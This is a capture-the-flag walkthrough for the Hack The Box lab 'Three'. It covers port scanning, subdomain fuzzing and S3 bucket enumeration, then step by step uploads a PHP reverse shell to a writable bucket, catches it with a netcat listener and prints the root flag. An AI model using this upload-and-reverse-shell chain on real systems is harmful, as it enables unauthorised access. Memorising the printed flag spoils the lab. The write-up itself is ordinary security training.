---
title: "HTB Tier 1: Three - Complete Walkthrough"
date: "2025-08-25"
tags: ["HTB", "Cybersecurity", "Beginner", "CTF", "Walkthrough"]
excerpt: "A complete step-by-step walkthrough for the HTB Tier 1: Three machine, including all commands, outputs, and explanations for tools used."
---

# HTB Tier 1: Three Walkthrough

This walkthrough provides a detailed step-by-step solution for the HTB Tier 1: Three machine. All commands, outputs, and explanations are included so anyone can follow along.

---

## Step 1

**Question:** How many TCP ports are open?  

**Answer:** 2  

**Command and Output:**
```bash
nmap -sV -sC 10.129.25.2
````

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-25 03:50 EDT
Nmap scan report for 10.129.25.2
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp open  http    Apache httpd 2.4.29
```

**Explanation:** Scans open TCP ports, identifies running services and versions.

---

## Step 2

**Question:** What is the domain of the email address provided in the "Contact" section of the website?

**Answer:** thetoppers.htb

**Method:** Visit the website and check the Contact section for the email domain.

---

## Step 3

**Question:** In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses?

**Answer:** `/etc/hosts`

**Command:**

```bash
sudo nano /etc/hosts
```

**Explanation:** Allows local hostname-to-IP resolution.

---

## Step 4

**Question:** Which sub-domain is discovered during further enumeration?

**Answer:** s3.thetoppers.htb

**Commands and Outputs:**

* **FFUF Fuzzing:**

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-u "http://thetoppers.htb" \
-H "Host: FUZZ.thetoppers.htb" -fs 11952 -mc all
```

```
s3                      [Status: 404, Size: 21]
gc._msdcs               [Status: 400, Size: 306]
```

* **Gobuster VHOST Enumeration:**

```bash
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-u http://thetoppers.htb --append-domain
```

```
s3.thetoppers.htb Status: 404 [Size: 21]
gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
```

**Explanation:** Virtual host enumeration using Host header fuzzing identifies subdomains.

---

## Step 5

**Question:** Which service is running on the discovered sub-domain?

**Answer:** Amazon S3

**Method:** Observing HTTP responses shows S3 bucket behavior.

---

## Step 6

**Question:** Which command line utility can be used to interact with the service running on the discovered sub-domain?

**Answer:** AWS CLI (`awscli`)

**Installation:**

```bash
sudo apt install awscli
```

---

## Step 7

**Question:** Which command is used to set up the AWS CLI installation?

**Answer:** `aws configure`

**Command:**

```bash
aws configure
```

**Explanation:** Configures AWS credentials, default region, and output format.

---

## Step 8

**Question:** What is the command used by the above utility to list all of the S3 buckets?

**Answer:** `aws s3 ls`

**Command and Output:**

```bash
aws s3 ls --endpoint-url http://s3.thetoppers.htb
```

```
2025-08-25 03:49:04 thetoppers.htb
```

---

## Step 9

**Question:** This server is configured to run files written in what web scripting language?

**Answer:** PHP

**Command and Output:**

```bash
aws s3 ls --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb
```

```
PRE images/
2025-08-25 03:49:04          0 .htaccess
2025-08-25 03:49:04      11952 index.php
```

**Explanation:** The presence of `index.php` confirms PHP as the server-side scripting language.

---

## Step 10

**Objective:** Find the root flag.

**Steps and Outputs:**

1. **Create PHP reverse shell**

   * Source: [Pentestmonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
   * Save as `shell.php`.

2. **Upload shell to S3:**

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/
```

```
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

3. **Set up listener:**

```bash
nc -lvnp 8080
```

```
listening on [any] 8080 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.25.2] 33394
Linux three 4.15.0-189-generic x86_64
```

4. **Access shell via browser:** Reverse shell connects.

5. **Search for root flag:**

```bash
find / -name flag.txt 2>/dev/null
```

```
/root/flag.txt
```

**Root Flag:**

```
a980d99281a28d638ac68b9bf9453c2b
```

---

## Tools Used

* **nmap**: Port scanning and service enumeration — [https://nmap.org/](https://nmap.org/)
* **ffuf**: Fuzzing hostnames to find subdomains — [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf)
* **gobuster**: Subdomain/vhost enumeration — [https://github.com/OJ/gobuster](https://github.com/OJ/gobuster)
* **AWS CLI**: Interacting with Amazon S3 buckets — [https://aws.amazon.com/cli/](https://aws.amazon.com/cli/)
* **PHP Reverse Shell**: Reverse shell payload for PHP web servers — [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

---
